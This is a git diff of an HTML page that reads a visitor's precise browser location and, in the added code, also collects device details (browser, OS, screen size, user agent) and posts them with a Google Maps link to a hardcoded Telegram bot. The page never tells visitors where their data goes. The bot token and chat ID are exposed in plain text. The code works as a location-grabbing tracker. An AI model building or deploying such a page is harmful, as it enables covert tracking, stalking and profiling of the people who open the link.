@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Where am I?</title>
+    <title>Device & Location Info</title>
 </head>
 <body>
-    <h2>Where am I?</h2>
+    <h2>Device & Location Info</h2>
     <p id="location">Fetching location...</p>
 
     <script>
@@ -14,7 +14,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError, {
                     enableHighAccuracy: true,
-                    timeout: 10000, 
+                    timeout: 10000,
                     maximumAge: 0
                 });
             } else {
@@ -25,11 +25,13 @@
         function showPosition(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-
             document.getElementById("location").innerHTML = `Latitude: ${lat} <br>Longitude: ${lon}`;
 
-            // ✅ Call sendLocation to send the data to Telegram
-            sendLocation(lat, lon);
+            // ✅ Collect device details
+            const deviceInfo = getDeviceDetails();
+
+            // ✅ Send data to Telegram
+            sendLocation(lat, lon, deviceInfo);
         }
 
         function showError(error) {
@@ -51,11 +53,48 @@
             document.getElementById("location").innerHTML = message;
         }
 
-        function sendLocation(lat, lon) {
-            const botToken = "8053207965:AAFxT4UzNGdzjiqNzkpjorMlXXz7cHNF6q0"; // 🔴 Replace with new bot token
+        function getDeviceDetails() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const browser = detectBrowser(userAgent);
+            const os = detectOS(userAgent);
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const deviceType = /mobile|tablet|ip(ad|hone|od)|android/i.test(userAgent) ? 'Mobile/Tablet' : 'Desktop';
+
+            return `🖥 Device Details:\n• Device Type: ${deviceType}\n• Browser: ${browser}\n• OS: ${os}\n• Screen Resolution: ${screenWidth}x${screenHeight}\n• User Agent: ${userAgent}`;
+        }
+
+        function detectBrowser(userAgent) {
+            if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edge") === -1) return "Google Chrome";
+            if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) return "Safari";
+            if (userAgent.indexOf("Firefox") > -1) return "Mozilla Firefox";
+            if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) return "Internet Explorer";
+            if (userAgent.indexOf("Edge") > -1) return "Microsoft Edge";
+            return "Unknown Browser";
+        }
+
+        function detectOS(userAgent) {
+    if (userAgent.indexOf("Windows NT 10.0") > -1) {
+        if (userAgent.indexOf("Windows 11") > -1) {
+            return "Windows 11"; // Specifically detects Windows 11
+        } else {
+            return "Windows 10"; // This is the fallback for Windows 10
+        }
+    }
+    if (userAgent.indexOf("Mac") > -1) return "MacOS";
+    if (userAgent.indexOf("X11") > -1) return "Linux";
+    if (userAgent.indexOf("Android") > -1) return "Android";
+    if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) return "iOS";
+    return "Unknown OS";
+}
+
+
+        function sendLocation(lat, lon, deviceInfo) {
+            const botToken = "8053207965:AAFxT4UzNGdzjiqNzkpjorMlXXz7cHNF6q0"; // 🔴 Replace with your bot token
             const chatId = "6238170291"; // 🔴 Replace with your Telegram chat ID
 
-            const message = `🌍 Location Details:\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+            const message = `🌍 Location Details:\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})\n\n${deviceInfo}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
